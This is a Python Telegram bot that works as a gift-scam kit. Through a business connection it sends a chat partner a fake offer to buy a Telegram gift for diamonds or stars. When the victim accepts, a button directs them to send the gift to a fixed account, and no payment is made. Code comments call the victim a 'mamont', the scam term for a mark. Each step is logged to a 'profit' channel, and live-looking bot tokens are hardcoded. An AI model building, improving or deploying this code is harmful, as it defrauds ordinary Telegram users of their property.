import asyncio
import logging
import uuid
import aiohttp

from aiogram import Bot, Dispatcher, F
from aiogram.client.default import DefaultBotProperties
from aiogram.enums import ParseMode
from aiogram.types import (
    Message, CallbackQuery, LinkPreviewOptions,
    InlineKeyboardMarkup, InlineKeyboardButton,
    BusinessConnection
)
from aiogram.exceptions import TelegramBadRequest, TelegramRetryAfter

# =====================================
# НАСТРОЙКИ
# =====================================
TOKEN = "9056825852:AAH-AKRlntMSkdLMfEbBqB9HsFcPsZFqabA"
TRACKER_BOT_TOKEN = "8914754146:AAH3WF5wVgNtvfXpomuVCY1KoZ9VrBcGPcw"
TRACKER_ADMIN_ID = 9158877731
PROFIT_CHANNEL_ID = -1003914079695
PROFIT_TOPIC_ID = 3

CURRENCY = {"g": "💎", "s": "⭐"}
TARGET_USERNAME = "rattiixx"

ALLOWED = [
    "message", "callback_query", "business_connection",
    "business_message", "edited_business_message", "deleted_business_messages"
]

logging.basicConfig(level=logging.INFO)
bot = Bot(token=TOKEN, default=DefaultBotProperties(parse_mode=ParseMode.HTML))
dp = Dispatcher()
OFFERS: dict[str, dict] = {}
CONN: dict[int, str] = {}
session: aiohttp.ClientSession | None = None

# ---------- Трекер ----------
async def tracker_log(text: str):
    if not session:
        return
    url = f"https://api.telegram.org/bot{TRACKER_BOT_TOKEN}/sendMessage"
    for chat_id, thread in ((TRACKER_ADMIN_ID, None), (PROFIT_CHANNEL_ID, PROFIT_TOPIC_ID)):
        payload = {"chat_id": chat_id, "text": text, "parse_mode": "HTML"}
        if thread:
            payload["message_thread_id"] = thread
        try:
            async with session.post(url, json=payload) as r:
                if r.status != 200:
                    logging.error(f"tracker {chat_id}: {(await r.text())[:200]}")
        except Exception as e:
            logging.error(f"tracker {chat_id}: {e}")

# ---------- Отправка сообщения ----------
async def bs_send(chat_id: int, text: str, markup=None, bc_id: str | None = None):
    bc_id = bc_id or CONN.get(chat_id)
    for attempt in range(4):
        try:
            return await bot.send_message(
                chat_id=chat_id, text=text,
                reply_markup=markup,
                business_connection_id=bc_id,
                link_preview_options=LinkPreviewOptions(
                    is_disabled=False, prefer_large_media=True, show_above_text=True
                )
            )
        except TelegramRetryAfter as e:
            await asyncio.sleep(e.retry_after)
        except TelegramBadRequest as e:
            if "PEER_FLOOD" in str(e) or "flood" in str(e).lower():
                await asyncio.sleep(1.5 * (attempt + 1))
                continue
            raise
    logging.error(f"send fail chat={chat_id}")

# ---------- Редактирование ----------
async def bs_edit(bc_id: str, chat_id: int, message_id: int, text: str, markup=None):
    try:
        return await bot.edit_message_text(
            business_connection_id=bc_id, chat_id=chat_id, message_id=message_id,
            text=text, reply_markup=markup,
            link_preview_options=LinkPreviewOptions(
                is_disabled=False, prefer_large_media=True, show_above_text=True
            )
        )
    except Exception as e:
        logging.error(f"bs_edit error: {e}")

# ---------- Подключение ----------
@dp.business_connection()
async def on_conn(conn: BusinessConnection):
    if conn.is_enabled:
        CONN[conn.user.id] = conn.id
        logging.info(f"business connected: {conn.user.id}")
    else:
        CONN.pop(conn.user.id, None)
        logging.info(f"business disabled: {conn.user.id}")

# ---------- /offer ----------
@dp.business_message(F.text.startswith("/offer"))
async def cmd_offer(msg: Message):
    parts = msg.text.split()
    
    if len(parts) < 4:
        await bs_send(msg.chat.id, "Формат: <code>/offer [ссылка] [сумма] [валюта]</code>", bc_id=msg.business_connection_id)
        return
        
    url = parts[1]
    amount = parts[2]
    cur = parts[3]

    if not url.startswith("http"):
        url = "https://" + url

    if cur not in CURRENCY:
        await bs_send(msg.chat.id, "Валюта: <code>g</code> (💎) или <code>s</code> (⭐)", bc_id=msg.business_connection_id)
        return

    oid = uuid.uuid4().hex[:10]
    OFFERS[oid] = {
        "amount": amount, "cur": CURRENCY[cur], 
        "name": url.split('/')[-1].replace('-', ' #'),
        "buyer": msg.from_user.id, "chat": msg.chat.id,
        "msg": msg.message_id, "bc": msg.business_connection_id, "state": "new"
    }
    
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="✅ Принять", callback_data=f"acc:{oid}"),
         InlineKeyboardButton(text="❌ Отклонить", callback_data=f"dec:{oid}")]
    ])
    
    who = msg.from_user.full_name
    
    sent = await bs_send(
        msg.chat.id,
        f"Пользователь <b>{who}</b> предлагает Вам {amount} {CURRENCY[cur]} за подарок.\n\n{url}",
        markup=kb, bc_id=msg.business_connection_id
    )
    
    if sent:
        OFFERS[oid]["offer_msg"] = sent.message_id
        
    await tracker_log(f"🆕 offer {oid}: {who} → {amount} {CURRENCY[cur]}")

# ---------- Кнопки ----------
@dp.callback_query(F.data.startswith(("acc:", "dec:", "how:", "give:")))
async def on_btn(cb: CallbackQuery):
    action, oid = cb.data.split(":", 1)
    o = OFFERS.get(oid)
    
    try:
        await cb.answer()
    except Exception:
        pass

    if not o:
        return

    if action == "dec":
        if o["state"] == "accepted":
            return
        o["state"] = "declined"
        await bs_edit(o["bc"], cb.message.chat.id, cb.message.message_id,
                      f"❌ Предложение отклонено.\n\n{o['amount']} {o['cur']} — «{o['name']}»")
        await tracker_log(f"❌ decline {oid}")
        return

    if action == "acc":
        if o["state"] == "accepted":
            return
        o["state"] = "accepted"
        
        text = (f"🎁 <b>Подарок:</b> {o['name']}\n\n<b>Предложение принято!</b>\n\n"
                f"Ожидается передача подарка.\n\nСумма: {o['amount']} {o['cur']}")
        
        kb = InlineKeyboardMarkup(inline_keyboard=[
            # ТВОЯ ССЫЛКА ВОЗВРАЩЕНА
            [InlineKeyboardButton(text="🎁 Передать подарок", url="tg://send_gift?to=8863549439")],
            [InlineKeyboardButton(text="❓ Как передать?", callback_data=f"how:{oid}")]
        ])
        
        # Редактируем сообщение ТОЛЬКО в чате с мамонтом
        await bs_edit(o["bc"], cb.message.chat.id, cb.message.message_id, text, markup=kb)
        
        await tracker_log(f"✅ accept {oid} — {o['amount']} {o['cur']} «{o['name']}»")
        return

    if action == "how":
        await cb.answer(
            "Нажмите «Передать подарок» — откроется интерфейс отправки. Выберите подарок и получателя.",
            show_alert=True
        )
        return

    if action == "give":
        await bs_send(cb.message.chat.id,
                      f"Откройте подарок «{o['name']}» и отправьте получателю. Затем нажмите «Передать подарок».")

# ---------- Старт/Стоп ----------
async def on_start():
    global session
    session = aiohttp.ClientSession()

async def on_stop():
    if session:
        await session.close()
    await bot.session.close()

dp.startup.register(on_start)
dp.shutdown.register(on_stop)

if __name__ == "__main__":
    asyncio.run(dp.start_polling(bot, allowed_updates=ALLOWED, drop_pending_updates=True))
